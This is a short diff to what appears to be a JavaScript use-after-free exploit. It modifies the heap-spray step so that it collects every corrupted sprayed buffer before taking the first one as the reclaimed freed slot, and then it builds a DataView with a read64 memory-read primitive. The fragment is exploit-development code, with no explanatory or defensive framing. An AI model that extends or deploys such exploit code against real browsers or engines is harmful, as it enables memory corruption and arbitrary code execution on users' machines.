@@ -17,6 +17,13 @@ function gc() {
 
 }
 
+function findAllCorrupted(buffers) {
+  const bad = [];
+  for (let i = 0; i < buffers.length; i++) {
+    if (buffers[i][0] !== 0x41) bad.push(i);
+  }
+  return bad;
+}
 
 function spray(count, size) {
   const arr = [];
@@ -93,9 +100,19 @@ async function main() {
  
   gc(); await sleep();
   const buffers = spray(SPRAY_COUNT, UAF_SIZE);
-  const {buf, idx} = findCorrupted(buffers);
+  const bad = findAllCorrupted(buffers);
+  if (!bad.length) {
+    die("No corrupted buffer");
+  }
+  log(`[+] Corrupted at indices: ${bad}`);
+ 
+//  const {buf, idx} = findCorrupted(buffers);
+   const idx = bad[0];
+  const buf = buffers[idx];
   log(`[+] Reclaimed slot at index ${idx}`);
+  
 
+ 
   const dv = new DataView(buf.buffer);
   function read64(view, offset) {
     const low = view.getUint32(offset, true);
